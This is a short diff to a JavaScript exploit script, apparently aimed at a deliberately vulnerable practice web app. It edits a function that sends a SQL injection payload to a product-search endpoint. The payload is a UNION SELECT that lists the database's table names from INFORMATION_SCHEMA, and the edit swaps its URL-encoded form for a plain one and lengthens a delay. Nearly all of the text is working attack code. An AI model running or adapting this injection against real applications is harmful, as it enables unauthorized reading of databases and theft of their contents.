@@ -34,8 +34,8 @@ async function exploit(targetURL){
 
     const spinner = ora('Running successful sql injection attack').start();
 
-    await new Promise(r => setTimeout(r, 500));
-    payload = "qwert%27))%20UNION%20SELECT%20TABLE_NAME,%202,%203,4,5,6,7,8,9%20FROM%20INFORMATION_SCHEMA.TABLES%20%23"
+    await new Promise(r => setTimeout(r, 1000));
+    payload = "qwert')) UNION SELECT TABLE_NAME, 2, 3,4,5,6,7,8,9 FROM INFORMATION_SCHEMA.TABLES #"
     spinner.text = 'Successful SQL Injection: ' + payload;
     await http().get(targetURL + '/rest/products/search',{
         "q": payload
